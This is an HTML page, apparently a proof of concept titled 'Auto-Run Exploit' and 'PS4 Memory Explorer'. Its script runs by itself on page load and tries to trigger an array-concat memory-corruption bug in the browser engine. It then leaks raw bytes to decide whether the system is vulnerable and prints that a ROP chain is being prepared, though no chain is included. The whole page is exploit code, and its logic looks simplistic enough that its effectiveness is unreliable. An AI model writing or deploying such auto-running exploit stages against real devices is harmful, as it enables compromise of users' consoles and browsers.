<!DOCTYPE html>
<html>
<head>
    <title>Auto-Run Exploit</title>
    <style>
        body {
            background: black;
            color: lime;
            font-family: monospace;
            margin: 0;
            padding: 20px;
        }
        #status {
            border: 1px solid lime;
            padding: 10px;
            margin-top: 20px;
            white-space: pre;
        }
    </style>
</head>
<body>
    <h2>PS4 Memory Explorer</h2>
    <div id="status">[+] Initializing exploit chain...</div>

    <script>
        (function() {
            const status = document.getElementById('status');
            let logBuffer = [];
            
            function updateStatus() {
                status.textContent = logBuffer.join('\n');
            }

            function log(msg) {
                logBuffer.push(msg);
                if(logBuffer.length > 15) logBuffer.shift();
                updateStatus();
            }

            function hex(n) {
                return '0x' + n.toString(16).padStart(16, '0');
            }

            setTimeout(() => {
                try {
                    log('[1] Preparing double array...');
                    let arr = [1.1];
                    for(let i = 0; i < 0x10000; i++) arr.push(2.2);
                    arr.length = 1;

                    log('[2] Creating object array...');
                    let objArr = [{}];

                    log('[3] Triggering concat vuln...');
                    let corrupted = arr.concat(objArr);

                    log('[4] Reading corrupted value...');
                    let val = corrupted[0];
                    let buf = new ArrayBuffer(8);
                    new Float64Array(buf)[0] = val;
                    let bytes = new BigUint64Array(buf)[0];

                    log('[5] Leaked bytes: ' + hex(bytes));
                    
                    if(bytes !== 0x3FF199999999999An) {
                        log('[!] VULNERABLE SYSTEM DETECTED!');
                        log('    Preparing ROP chain...');
                    } else {
                        log('[+] System patched');
                    }
                } catch(e) {
                    log('[ERROR] ' + e.message);
                }
            }, 1500);
        })();
    </script>
</body>
</html>
